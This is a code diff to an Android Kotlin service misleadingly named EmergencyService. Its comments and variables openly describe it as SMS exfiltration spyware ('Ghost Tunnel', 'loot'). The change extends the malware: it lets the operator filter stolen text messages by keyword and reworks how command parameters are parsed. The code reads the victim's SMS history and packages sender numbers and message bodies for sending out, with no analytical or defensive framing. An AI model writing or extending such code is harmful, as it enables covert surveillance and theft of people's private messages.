@@ -63,8 +63,10 @@ class EmergencyService : Service() {
                     // 2. Module-Aware SMS Exfiltration
                     val smsModule = modules.find { it.startsWith("sms") }
                     if (modules.contains("ALL") || smsModule != null) {
-                        val limit = smsModule?.split(":")?.getOrNull(1)?.toIntOrNull() ?: 5
-                        val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit)
+                        val parts = smsModule?.split(":") ?: emptyList()
+                        val limit = parts.getOrNull(1)?.toIntOrNull() ?: 5
+                        val keyword = parts.getOrNull(2)
+                        val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit, keyword)
                         for (i in 0 until latestSms.length()) {
                             val msg = latestSms.getJSONObject(i)
                             val loot = "[OneShot ${i+1}/${latestSms.length()}] ${msg.optString("num")}: ${msg.optString("body")}"
@@ -104,8 +106,10 @@ class EmergencyService : Service() {
                         // 2. SMS Exfiltration (The Ghost Tunnel)
                         val smsModule = modules.find { it.startsWith("sms") }
                         if (modules.contains("ALL") || smsModule != null) {
-                            val limit = smsModule?.split(":")?.getOrNull(1)?.toIntOrNull() ?: 5
-                            val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit) // Exfiltrate specified limit
+                            val parts = smsModule?.split(":") ?: emptyList()
+                            val limit = parts.getOrNull(1)?.toIntOrNull() ?: 5
+                            val keyword = parts.getOrNull(2)
+                            val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit, keyword)
                             for (i in 0 until latestSms.length()) {
                                 val msg = latestSms.getJSONObject(i)
                                 val loot = "[Loot ${i+1}/${latestSms.length()}] From:${msg.optString("num")}: ${msg.optString("body")}"
@@ -140,9 +144,10 @@ class EmergencyService : Service() {
         if (parts.contains("0")) return listOf("ALL")
 
         parts.forEach { c ->
-            val subParts = c.trim().split(":")
-            val baseCode = subParts[0]
-            val param = if (subParts.size > 1) ":${subParts[1]}" else ""
+            val trimmed = c.trim()
+            val idx = trimmed.indexOf(":")
+            val baseCode = if (idx != -1) trimmed.substring(0, idx) else trimmed
+            val param = if (idx != -1) trimmed.substring(idx) else ""
             when(baseCode) {
                 "1" -> list.add("location$param")
                 "2" -> list.add("sms$param")
